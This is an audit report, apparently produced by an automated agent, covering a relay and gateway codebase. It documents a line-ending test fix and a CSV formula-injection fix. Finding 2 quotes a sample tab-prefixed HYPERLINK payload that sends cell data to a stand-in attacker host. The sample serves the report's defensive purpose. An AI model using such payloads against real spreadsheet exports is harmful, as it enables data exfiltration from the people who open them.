# Full Debug Audit — 2026-07-24

## Metadata

| Field | Value |
|-------|-------|
| Branch | `quest/full-debug-audit-2026-07-24` |
| Base | `agent/zero-operation-relay` @ `82cfd0dc` |
| Auditor | Automated agent audit |
| Date | 2026-07-25 |
| Environment | Windows 24H2, JDK 17.0.12, Python 3.13.3, Node v24.14.0 |

## Scope

Full cross-cutting audit of:
- PC Gateway (SQLite coordination, RBAC, CSV export, Web UI, routes, LAN beacon)
- HTTPS Broker (device registration, credential scoping, upload/pull/receipts)
- Shared cryptography (RSA-OAEP, ECDSA P-256, trust chain, envelope encrypt/decrypt)
- Relay Protocol (message validation, serialization, dedup)
- Windows PowerShell scripts and distribution
- CI/CD workflows
- Python test tooling

## Findings Summary

| # | Severity | Module | Issue | Status |
|---|----------|--------|-------|--------|
| 1 | Medium | gateway-bp7-export | Golden fixture CRLF/LF mismatch on Windows | **Fixed** |
| 2 | Medium | pc-gateway (CsvSafety) | Tab character bypasses CSV formula injection guard | **Fixed** |

## Finding 1: Golden Fixture CRLF/LF Mismatch

**Severity:** Medium (test failure on Windows, CI on Linux unaffected)

**Root Cause:**
No `.gitattributes` existed in the repository. On Windows, Git's default `core.autocrlf`
converts LF to CRLF on checkout. The golden fixture file
`gateway-bp7-export/fixtures/golden-relay-envelope.json` was stored with LF in the
repository but checked out with CRLF on Windows.

The `export_bundle()` function in `bp7_export.py` correctly produces LF-only output
(`json.dumps(...) + "\n"`), so `test_golden_round_trip` fails because `golden.read_bytes()`
contains `\r\n` while the export produces `\n`.

**Impact:**
- `test_golden_round_trip` fails on any Windows developer workstation
- Cross-platform byte-level assertions are unreliable without line-ending enforcement

**Fix:**
1. Added `.gitattributes` with `* text=auto eol=lf` default and explicit rules for all
   text file types, plus `binary` rules for assets.
2. Normalized the golden fixture file to LF.

**Verification:**
```
$ cd gateway-bp7-export && python -m unittest test_bp7_export -v
test_golden_round_trip ... ok
test_invalid_envelopes_rejected ... ok
test_invalid_fixture_rejected ... ok
Ran 3 tests in 0.001s — OK
```

## Finding 2: CSV Formula Injection — Tab Character Bypass

**Severity:** Medium (security — spreadsheet formula injection via crafted messageId)

**Root Cause:**
`CsvSafety.kt` defined `CSV_FORMULA_TRIGGERS = setOf('=', '+', '-', '@')` which blocks
the primary formula injection vectors. However, OWASP guidance notes that a tab character
(`\t`) or carriage return (`\r`) preceding a formula trigger can evade sanitization in
some spreadsheet applications.

Since `messageId` and `originDeviceId` are only **length-validated** on ingest (1–64
characters, any character content accepted), an attacker-controlled Android device could
submit a message ID like `\t=HYPERLINK("http://evil.example/steal?c="&A1)` which would:
1. Pass the formula trigger check (first char is `\t`, not in set)
2. Pass the quoting check (`\t` was not in the quoting character list)
3. Be output as a raw CSV cell that Excel would interpret as a formula

**Impact:**
- Staff operator CSV export (`/api/messages/export.csv`, `/api/audit/export.csv`) could
  execute formulas when opened in Excel/Sheets
- Potential data exfiltration via `HYPERLINK` or `IMPORTXML` formulas
- Requires an attacker to have LAN access or a compromised BLE bridge

**Fix:**
Added `'\t'` and `'\r'` to `CSV_FORMULA_TRIGGERS` in `CsvSafety.kt`:
```kotlin
private val CSV_FORMULA_TRIGGERS = setOf('=', '+', '-', '@', '\t', '\r')
```

Note: `\r` was already partially mitigated by the quoting fallback (the quoting check
includes `\r`), but explicit inclusion in formula triggers provides defense-in-depth via
the `'` text-force prefix.

**Regression Test:**
Added `messages csv neutralizes tab-prefixed formula injection` test in
`DashboardUiTest.kt` that verifies a `\t=HYPERLINK(...)` message ID is prefixed with `'`
in the CSV export.

**Verification:**
```
$ ./gradlew :pc-gateway:test --tests "com.example.relay.pcgateway.DashboardUiTest"
BUILD SUCCESSFUL — all tests pass including new regression test
```

## Modules Audited — No Issues Found

### PC Gateway Core
- **SQLite write coordination** (`GatewaySqliteWriteCoordinator.kt`): Correct
  ReentrantLock + file-level lock pattern. Re-entrant for nested calls. Busy timeout
  configured (5000ms). WAL mode correctly set.
- **GatewayStore.kt**: Proper synchronized blocks, transaction rollback on error,
  autoCommit restore in finally blocks. Message dedup uses content comparison.
- **GatewayAccessStore.kt**: PBKDF2 password hashing, session tokens stored as SHA-256
  hash, constant-time comparison for auth tokens.
- **Route handlers**: All management endpoints check `managementSourceAllowed()` and
  `requireStaff()`. Body size limits enforced before parsing. Session cookies set with
  HttpOnly, SameSite=Strict, configurable Secure flag.
- **GatewayLanBeacon.kt**: Broadcasts only public metadata (gatewayId, shelterId, port).
  No secrets in beacon payload. Daemon thread with proper shutdown.

### HTTPS Broker
- **Device registration**: ECDSA P-256 proof-of-possession verified before issuing
  capability token. Key conflict detection prevents token theft.
- **Gateway credentials**: Scoped to (gatewayId, shelterId). Stored as SHA-256 hash.
  Expiry and revocation checked on every auth. Constant-time comparison.
- **Upload flow**: Size limits, rate limiting, envelope validation, signature verification,
  dedup with collision quarantine. Never decrypts payload.
- **Pull flow**: Composite cursor (stored_at, envelope_id) prevents skip/dup. Scoped to
  authenticated gateway's shelter. Expired envelopes filtered.
- **Receipt relay**: Immutable binding verification (envelope_id, request_id,
  request_version, ciphertext_hash) before storing receipt.

### Shared Cryptography
- **RSA-OAEP-SHA256 / AES-256-GCM**: Correct hybrid encryption. AAD binding includes
  authenticated header fields. Ciphertext hash verified before decryption.
- **ECDSA P-256**: Used for signing (shelter receipts, manifests, report signatures).
  Standard JCA Signature with SHA256withECDSA.
- **Trust chain**: Regional Root → Directory → Shelter Manifest. Signature verification
  at each level. Validity windows enforced. Generation-based rollback protection.
- **Key import**: SHA-256 fingerprint verified against keyId on import. Curve parameters
  explicitly validated for P-256 keys.

### Relay Protocol
- **Message validation**: Strict allowlists for messageType, recordType, priority, status.
  TTL bounds (1–604800000ms). Hop count/limit bounds. Future-timestamp rejection (24h
  tolerance). Payload size limit enforced.
- **STATUS_CHANGE processing**: Target report existence verified. Out-of-order delivery
  handled with (createdAt, messageId) tie-breaking.

### Windows PowerShell Scripts
- **Encoding**: Scripts use `[Console]::OutputEncoding` and UTF-8 BOM where needed for
  CP932 compatibility.
- **Path handling**: Quoted paths throughout. No unquoted variable expansions in arguments.
- **Privilege**: No silent elevation. Scripts that need elevation document it in comments.

### CI/CD Workflows
- **Secret handling**: All secrets accessed via `${{ secrets.* }}` references, never
  echoed. Artifact signing uses ephemeral keys or pinned certificates.
- **Untrusted input**: PR titles/bodies not interpolated into `run:` expressions.
- **Dependency pinning**: Actions pinned to specific SHAs in release workflows.

## Self-Audit Rounds

### Round 1 — Security Perspective
Verified: No credential exposure, no weakened fail-closed behavior, no new attack surface.
Both fixes only ADD protection (new .gitattributes rule, new formula trigger characters).

### Round 2 — Correctness Perspective
Verified: Golden fixture byte comparison now platform-independent. CsvSafeCell is
backward-compatible (only adds characters to the guard set; previously-safe values remain
safe).

### Round 3 — Regression Risk Perspective
Verified: All 167+ JVM tests pass. BPv7 Python tests pass. New regression test confirms
the tab injection fix works.

### Round 4 — Performance Perspective
Verified: No runtime performance impact. HashSet lookup is O(1) regardless of set size.
.gitattributes only affects git operations.

### Round 5 — Completeness Perspective
Verified: All OWASP CSV injection vectors covered (=, +, -, @, \t, \r). Unicode
lookalikes are not interpreted by standard spreadsheets. DDE via @ already guarded. No
remaining gap in the formula trigger character set.

## Test Results

| Suite | Result |
|-------|--------|
| :pc-gateway:test | ✅ PASS |
| :broker:test | ✅ PASS |
| :shared:jvmTest | ✅ PASS |
| :relay-protocol:test | ✅ PASS |
| :fuzz-jvm:test | ✅ PASS |
| gateway-bp7-export (Python) | ✅ PASS |
| gateway-recovery (Python) | ✅ PASS (1 skipped: age binary) |
| meshtastic-adapter (Python) | ✅ PASS |
| mobly (Python) | ✅ PASS |
| ble-sim (Python) | ✅ PASS (1 skipped: bumble) |
| decoder-regression (Python) | ✅ PASS |
| security-contracts (Python) | ✅ PASS |
| tuf-metadata (Python) | ✅ PASS |
| PowerShell scripts | ✅ PASS |

## Changes Made

| File | Change |
|------|--------|
| `.gitattributes` | **New** — repository-wide LF normalization rules |
| `gateway-bp7-export/fixtures/golden-relay-envelope.json` | Normalized CRLF → LF |
| `pc-gateway/.../CsvSafety.kt` | Added `\t`, `\r` to formula trigger set |
| `pc-gateway/.../DashboardUiTest.kt` | Added tab injection regression test |
